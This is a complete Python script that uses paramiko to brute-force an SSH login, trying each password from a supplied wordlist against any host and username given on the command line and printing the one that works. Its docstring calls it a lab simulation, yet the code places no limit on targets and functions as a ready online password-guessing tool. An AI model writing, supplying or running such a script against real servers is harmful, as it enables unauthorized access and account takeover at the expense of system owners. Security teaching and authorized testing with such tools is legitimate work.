#!/usr/bin/env python3
import paramiko
import argparse
import time

def ssh_brute_force(host, user, password_file):
    """
    Brute-force SSH login simulation on a local test server.
    Only use in lab environment.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, "r") as f:
        passwords = f.read().splitlines()

    for pwd in passwords:
        try:
            print(f"Trying password: {pwd}")
            ssh.connect(hostname=host, username=user, password=pwd, timeout=3)
            print(f"[+] Success! Password found: {pwd}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            pass  # Wrong password, continue
        except paramiko.SSHException as e:
            print(f"[!] SSH error: {e}")
        time.sleep(0.2)  # avoid too fast attempts
    print("[-] Password not found in list.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Force Simulation")
    parser.add_argument("--host", required=True, help="Target host IP")
    parser.add_argument("--user", required=True, help="SSH username")
    parser.add_argument("--passwords", required=True, help="File with password list")
    args = parser.parse_args()
    ssh_brute_force(args.host, args.user, args.passwords)

